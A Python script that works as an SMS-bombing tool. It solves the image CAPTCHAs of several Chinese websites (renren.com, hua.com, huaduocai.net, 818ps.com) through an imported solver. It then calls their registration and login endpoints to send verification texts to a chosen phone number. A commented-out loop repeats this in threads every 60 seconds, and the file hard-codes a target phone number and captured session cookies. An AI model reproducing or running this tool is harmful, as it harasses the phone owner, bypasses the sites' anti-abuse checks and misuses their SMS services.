import json
import random
import threading
import requests

import base64
import jsonpath
import time

from renren.stringcode import code_cotent



headers= {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.3",

            "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
}
class mobilecode(object):
    def __init__(self,codeurl,mobileurl,data,headers,key=None,time_out=100,code_type=1004):
        self.codeurl=codeurl
        self.mobileurl=mobileurl
        self.data=data
        self.headers=headers
        self.time_out=time_out
        self.code_type=code_type
        self.key=key



    def get_imagecode(self):
        result = requests.get(url=self.codeurl, headers=self.headers)
        # code1=result.content().decode("GBK")
        code = code_cotent(self.time_out, result.content, self.code_type)

        return code


    def start(self):
        if self.key:
            self.data[self.key]=self.get_imagecode()

        result = requests.post(url=self.mobileurl, headers=self.headers, data=self.data)
        print(result.content.decode("utf-8"))



def ren1(mobile):
    ren = {
        "codeurl": "http://icode.renren.com/getcode.do?t=web_reg&amp;rnd=1576198486127",
        "mobileurl": "http://reg.renren.com/ajax-mobile-code-new.do",
        "data": {"opt": 1, "mn": mobile, "icode_type": "web_reg", "requestToken": None, "rtk": "b14633e7"},
        "key": "icode",
        "headers": {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.3",
            "cookie": "anonymid=k43fqg83wjkpzt; depovince=GW; _r01_=1; ick_login=5d26e0f6-b6df-4c6e-9c00-23bca34cd619; ick=6a22f30d-12e2-46ee-a110-966d6bcc4623; jebecookies=14beb16a-622c-4496-9822-0b8cc2941bb7|||||"},
        "code_type": 1000
    }
    renren1 = mobilecode(**ren)
    renren1.start()

def hua1(mobile):
    hua={
        "codeurl": "https://www.hua.com/Passport/Login/BaseImageValidCode?x=Fri,%2013%20Dec%202019%2010:41:10%20GMT",
        "mobileurl": "https://www.hua.com/Passport/Register/SendRegisterSmsValidCode",
        "data": {"mobile": mobile,},
        "key": "picValidCode",
        "headers": {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.3",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "ASP.NET_SessionId=5xvey2jjoibsbn44fnwicx4z; Hm_lvt_5f4aa36509ee08b412f4647f6d4f1749=1576233486; _ga=GA1.2.1735599453.1576233486; _gid=GA1.2.1083404265.1576233486; isFrom=bda-j003-PC-23003097302; bd_vid_url=https://www.hua.com/?sid=bda-j003-PC-23003097302&utm_source=baidua&utm_medium=cpc&utm_term=PC-23003097302-A003-%E8%8A%B1&bd_vid=6938004201397609017; Hm_lpvt_5f4aa36509ee08b412f4647f6d4f1749=1576238164; CookiesUnique=f7e8b5a4-e853-4458-b437-04b42ffd0960~2019/12/13~2019/12/13~0~0; MEIQIA_TRACK_ID=1UvXhvAaCLCaCI1Yu6qZRruiGw7; MEIQIA_VISIT_ID=1UvXhuSW2J6htE1nEe3a8yHt11r"
           }
    }

    huahua1=mobilecode(**hua)
    huahua1.start()

def hua2(mobile):

    url="https://zuul.huaduocai.net/api/web/hdc/getPictureV"

    data={

        "shopCode": 7476808499516823,
        "username":mobile,

    }

    response=requests.post(url=url,headers=headers,data=data)



    c=response.content.decode('utf-8')
    result=json.loads(c)

    image=result["output"]["img"]
    codeUnicode=result["output"]["codeUnicode"]
    codeurl = "data:image/gif;base64," + image

    # 用base64解码生成图片
    image=base64.b64decode(image)
    with open("1.jpg","wb") as f:
        f.write(image)
    code=code_cotent(100,image,1004)
    print(code)




    key= {
        "codeurl": codeurl,
        "mobileurl": "https://zuul.huaduocai.net/api/web/hdc/getMobileNumberV",
        "data": {
                "codeUnicode":codeUnicode,
                "shopCode": 7476808499516823,
                "code": code,
                "username": mobile },

        "headers": {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "appcode": "23434423"

        }
    }
    print(key['data'])

    huahua2=mobilecode(**key)
    huahua2.start()









    # huahua2 = mobilecode(**key)
    # huahua2.start()

def hua3(mobile):
    c=random.randint(157632160000,157632260000)
    codeurl="https://818ps.com/site-api/validate-code-img?v="+str(c)
    headers = {
        "Accept": "application/json,text/javascript,*/*;q = 0.01",
        "Accept-Encoding": "gzip,deflate,br",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.3",
        "Cookie":"IPSSESSION=19au7psejfd1852co2dpno6h03; ui_818ps=dWlkPTAmdWM9JnY9MSZ1cz1iYWlkdSZ0PWM1NWI1YjUyMWViMmVhMTZjM2I1ZjRhNmExMzNlMThiMTU3NjMyMTU3MS41NTg0MzY4MjMmZ3I9MSZ1cnM9; track_id=4797a9bf2d1a73c941a9537751a6610c54d377503a14bcba3a13318b77843a29a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22track_id%22%3Bi%3A1%3Bs%3A52%3A%22c55b5b521eb2ea16c3b5f4a6a133e18b1576321571.558436823%22%3B%7D; _csrf=33ff4c2a2041c2a7d6f152a81b9b0adecd37b3db428fabff585f242b5fc6f626a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22ZG%EE%21%93%A1%5Cy%E0TQy%B6%1C%1C%B1%16%A7%24%D0%1D%86%25Y%9D%EC%D6%AF%EC%98%26%21%22%3B%7D; FIRSTVISITED=1576321571.807; Hm_lvt_68ba0271f600f1146717e15ebd6337d1=1576321572; Hm_lpvt_68ba0271f600f1146717e15ebd6337d1=1576321572"
    }
    result = requests.get(url=codeurl, headers=headers)
    # code1=result.content().decode("GBK")
    code = code_cotent(100, result.content, 1004)
    print(code)

    mobileurl="https://818ps.com/site-api/send-tel-login-code?num=%d&codeImg=%s"%(mobile,code)

    response=requests.get(mobileurl,headers=headers)
    print(response.content.decode("gbk"))

def start(mobile):
    ren1(mobile)
    hua1(mobile)
    hua2(mobile)



if __name__ == '__main__':
    hua3(18206106822)

    # mobile=18206106822
    # list1=(ren1,hua1,hua2)
    # while True:
    #     for i in list1:
    #
    #         send_code=threading.Thread(target=i,args=(18206106822,))
    #
    #         send_code.start()
    #     time.sleep(60)



